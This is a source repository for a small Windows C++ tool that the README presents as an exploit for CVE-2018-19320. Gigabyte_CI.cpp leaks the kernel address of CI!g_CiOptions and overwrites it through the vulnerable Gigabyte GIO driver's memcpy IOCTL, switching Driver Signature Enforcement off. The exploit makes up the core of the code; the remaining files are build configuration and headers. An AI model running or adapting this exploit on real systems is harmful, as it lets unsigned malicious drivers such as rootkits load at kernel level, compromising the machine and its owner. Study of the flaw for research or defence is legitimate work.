Project Path: arc_gmh5225_CVE-2018-19320_uk_xuodt

Source Tree:

```txt
arc_gmh5225_CVE-2018-19320_uk_xuodt
├── Gigabyte_CI
│   ├── Gigabyte_CI
│   │   ├── Gigabyte_CI.cpp
│   │   ├── Gigabyte_CI.vcxproj
│   │   ├── Gigabyte_CI.vcxproj.filters
│   │   ├── Gigabyte_CI.vcxproj.user
│   │   ├── stdafx.cpp
│   │   ├── stdafx.h
│   │   └── targetver.h
│   └── Gigabyte_CI.sln
└── README.md

```

`Gigabyte_CI/Gigabyte_CI.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.27428.2037
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Gigabyte_CI", "Gigabyte_CI\Gigabyte_CI.vcxproj", "{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Debug|x64.ActiveCfg = Debug|x64
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Debug|x64.Build.0 = Debug|x64
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Debug|x86.ActiveCfg = Debug|Win32
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Debug|x86.Build.0 = Debug|Win32
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Release|x64.ActiveCfg = Release|x64
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Release|x64.Build.0 = Release|x64
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Release|x86.ActiveCfg = Release|Win32
		{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {21F043AA-C407-411A-8D12-4355220FFE1E}
	EndGlobalSection
EndGlobal

```

`Gigabyte_CI/Gigabyte_CI/Gigabyte_CI.cpp`:

```cpp
// Gigabyte_CI.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

BOOL g_ListDrivers = FALSE;

void Usage()
{
	printf("Usage: Gigabyte_CI.exe <options>\n");
	printf("Options:\n");
	printf("  -h\t\tShow this message.\n");
	printf("  -s\t\tShow all Kernel Modules Base Addresses'\n");
	printf("  -l\t\tLeak ci!CiInitialize and CI!g_CiOptions\n");
	printf("  -e\t\tEnable Driver Signing\n");
	printf("  -d\t\tDisable Driver Signing\n");
}

BOOL EnumSystemDrivers(PVOID* ModuleBase, PCHAR ModuleImage)
{
	_NtQuerySystemInformation NtQuerySystemInformation;
	PSYSTEM_MODULE_INFORMATION pModuleInfo;
	PSYSTEM_MODULE_INFORMATION_ENTRY pSystemModuleEntry = NULL;
	ULONG i, len;
	NTSTATUS ret;
	HMODULE ntdllHandle;
	CHAR kFullName[256];

	ntdllHandle = GetModuleHandle(L"ntdll");
	if (!ntdllHandle)
		return FALSE;

	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdllHandle, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
		return FALSE;

	ret = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);

	ret = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

	if (g_ListDrivers)
		printf("Base Address\t ImageName\n");
	
	for (i = 0; i < pModuleInfo->Count; i++)
	{
		if(g_ListDrivers)
			printf("%p %s\n", pModuleInfo->Module[i].Base, pModuleInfo->Module[i].ImageName);

		if (strstr(pModuleInfo->Module[i].ImageName, "CI.dll") != NULL)
		{
			strcpy_s(ModuleImage, sizeof(kFullName) - 1, pModuleInfo->Module[i].ImageName);
			*ModuleBase = pModuleInfo->Module[i].Base;
		}
	}

	return TRUE;
}

BOOL driverPwn(ULONG64 dst, BOOL enable)
{
	GIO_MemCpyStruct mystructIn;
	mystructIn.dest = dst;
	ULONG64* cioptions = (ULONG64*)malloc(sizeof(ULONG64));
	if (enable)
		*cioptions = 0x6;
	else
		*cioptions = 0xe;
	mystructIn.src = cioptions;
	mystructIn.size = 1;

	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	wchar_t szDeviceNames[] = L"\\\\.\\GIO";
	HANDLE ghDriver = CreateFile(szDeviceNames, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (ghDriver == INVALID_HANDLE_VALUE) {
		printf("Cannot get handle to driver \'%S\' - GetLastError:%d\n", szDeviceNames, GetLastError());
		return FALSE;
	}

	DeviceIoControl(ghDriver, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);

	CloseHandle(ghDriver);

	if (returned) {
		return TRUE;
	}
	return FALSE;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		Usage();
		return 0;
	}

	CHAR kFullName[256];
	PVOID kBase = NULL;
	BOOL status;

	if (strcmp(argv[1], "-s") == 0)
		g_ListDrivers = TRUE;

	memset(kFullName, 0x00, sizeof(kFullName));
	status = EnumSystemDrivers(&kBase, kFullName);
	if (!status)
		return FALSE;

	if (strcmp(argv[1], "-s") == 0)
		return 0;

    PBYTE CiInitialize = NULL;
    HMODULE hModule = LoadLibraryExA("CI.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);

    if (hModule == NULL)
        return 0;

    CiInitialize = (PBYTE)GetProcAddress(hModule, "CiInitialize");

    if (CiInitialize == NULL)
        return 0;

	ULONG64 xpto = (ULONG64)(CiInitialize - (PBYTE)hModule + (PBYTE)kBase);

	if (strcmp(argv[1], "-l") == 0)
	{
		printf("%p (CI.dll)\n", kBase);
		printf("%p (Ci!CiInitialize)\n", xpto);
		printf("%p (CI!g_CiOptions)\n", (xpto-0x9eb8));
		return 0;
	}

	if (strcmp(argv[1], "-e") == 0)
	{
		driverPwn((ULONG64)(CiInitialize - (PBYTE)hModule + (PBYTE)kBase - 0x9eb8), TRUE);
		printf("[+] Driver Signing has been ENABLED!\n");
	}
	if (strcmp(argv[1], "-d") == 0)
	{
		driverPwn((ULONG64)(CiInitialize - (PBYTE)hModule + (PBYTE)kBase - 0x9eb8), FALSE);
		printf("[+] Driver Signing has been DISABLED!\n");
	}
    return 0;
}


```

`Gigabyte_CI/Gigabyte_CI/Gigabyte_CI.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{C34FEF43-D508-4A30-8F51-7E5FD0A3BE96}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>GigabyteCI</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
    <PostBuildEvent>
      <Command>copy $(TargetPath) c:\users\rui\desktop\kd-transfer\</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Gigabyte_CI.cpp" />
    <ClCompile Include="stdafx.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Gigabyte_CI/Gigabyte_CI/Gigabyte_CI.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Gigabyte_CI.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`Gigabyte_CI/Gigabyte_CI/Gigabyte_CI.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`Gigabyte_CI/Gigabyte_CI/stdafx.cpp`:

```cpp
// stdafx.cpp : source file that includes just the standard includes
// Gigabyte_CI.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"

// TODO: reference any additional headers you need in STDAFX.H
// and not in this file

```

`Gigabyte_CI/Gigabyte_CI/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <stdio.h>


// TODO: reference additional headers your program requires here

typedef struct {
	PVOID   Unknown1;
	PVOID   Unknown2;
	PVOID   Base;
	ULONG   Size;
	ULONG   Flags;
	USHORT  Index;
	USHORT  NameLength;
	USHORT  LoadCount;
	USHORT  PathLength;
	CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemModuleInformation = 11,
	SystemHandleInformation = 16

} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_HANDLE_INFORMATION_ENTRY
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	SHORT Handle;
	PVOID Object;
	ULONG GrantedAccess;

} SYSTEM_HANDLE_INFORMATION_ENTRY, * PSYSTEM_HANDLE_INFORMATION_ENTRY;

typedef struct {
	ULONG   Count;
	SYSTEM_HANDLE_INFORMATION_ENTRY Handle[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

// driver



#define IOCTL_GIO_MEMCPY 0xC3502808



#pragma pack (push,1)

typedef struct _GIO_MemCpyStruct {
	ULONG64 dest;
	ULONG64* src;
	DWORD size;
} GIO_MemCpyStruct;

#pragma pack(pop)
```

`Gigabyte_CI/Gigabyte_CI/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`README.md`:

```md
# CVE-2018-19320

Exploiting ring0 memcpy-like functionality to disable Driver Signing Enforcement (DSE) as documented here: http://deniable.org/windows/windows-callbacks

### References

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19320
- https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities 

```